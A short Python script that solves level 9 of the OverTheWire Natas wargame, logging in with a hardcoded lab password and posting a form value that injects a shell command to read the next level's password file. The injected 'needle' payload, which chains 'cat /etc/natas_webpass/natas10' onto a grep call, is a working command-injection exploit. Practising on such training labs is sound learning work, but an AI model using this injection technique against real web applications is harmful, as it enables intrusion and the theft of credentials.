#!/usr/local/bin/env python
import requests
import re
import base64


username = "natas9"
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.post(url, auth=(username, password), data={"needle": "zool dictionary.txt | cat /etc/natas_webpass/natas10 ; rm", "submit": "submit"})
content = response.text

# print(content)
print(re.findall('<pre>\n(.*)\n</pre>', content)[0])
